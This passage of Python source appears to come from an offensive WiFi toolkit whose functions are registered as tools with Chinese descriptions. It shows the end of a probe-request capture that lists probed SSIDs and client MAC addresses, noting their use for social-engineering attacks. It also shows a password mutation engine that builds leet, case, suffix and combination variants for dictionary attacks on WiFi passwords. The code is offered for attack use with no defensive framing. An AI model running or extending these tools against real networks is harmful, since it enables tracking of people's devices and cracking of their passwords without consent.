                        parts = [p.strip() for p in line.split(",")]
                        if len(parts) >= 6 and parts[5].strip():
                            mac = parts[0]
                            probed_ssid = parts[5].strip()
                            if probed_ssid and probed_ssid != "":
                                if probed_ssid not in probes:
                                    probes[probed_ssid] = []
                                if mac not in probes[probed_ssid]:
                                    probes[probed_ssid].append(mac)
            os.remove(csv_file)
        except Exception:
            pass

        probe_list = [{"ssid": ssid, "clients": macs, "count": len(macs)}
                      for ssid, macs in sorted(probes.items(),
                                               key=lambda x: len(x[1]), reverse=True)]

        return json.dumps({
            "platform": platform,
            "interface": interface,
            "duration": duration,
            "unique_ssids_probed": len(probes),
            "probes": probe_list[:50],
            "note": "探测请求(Probe Request)揭示设备曾经连接过的WiFi网络，可用于社会工程学攻击。",
        }, ensure_ascii=False)

    return json.dumps({"error": f"不支持的操作系统: {platform}"}, ensure_ascii=False)


@register(
    "wifi_password_mutate",
    "密码变异引擎 — 对基础密码应用leet speak/大小写/后缀/反转/组合等规则生成变体列表，用于字典攻击优化。",
    {
        "password": {"type": "string", "description": "基础密码或逗号分隔的密码列表"},
        "rules": {"type": "string", "description": "变异规则: leet, case, suffix, repeat, reverse, combo, all (默认)"},
    }
)
def wifi_password_mutate(password: str, rules: str = "all") -> str:
    seeds = [p.strip() for p in password.split(",") if p.strip()]

    all_mutations = []
    for seed in seeds[:20]:  # 最多20个种子
        mutations = _mutate_password(seed, rules)
        all_mutations.append({
            "seed": seed,
            "variant_count": len(mutations),
            "variants": mutations[:30],
        })

    # 合并所有变异并去重
    unique_all = list(set(
        v for m in all_mutations for v in m["variants"]
    ))

    return json.dumps({
        "seeds": len(seeds),
        "rules": rules,
        "total_variants": len(unique_all),
        "per_seed": all_mutations,
        "all_unique": unique_all[:100],
    }, ensure_ascii=False)
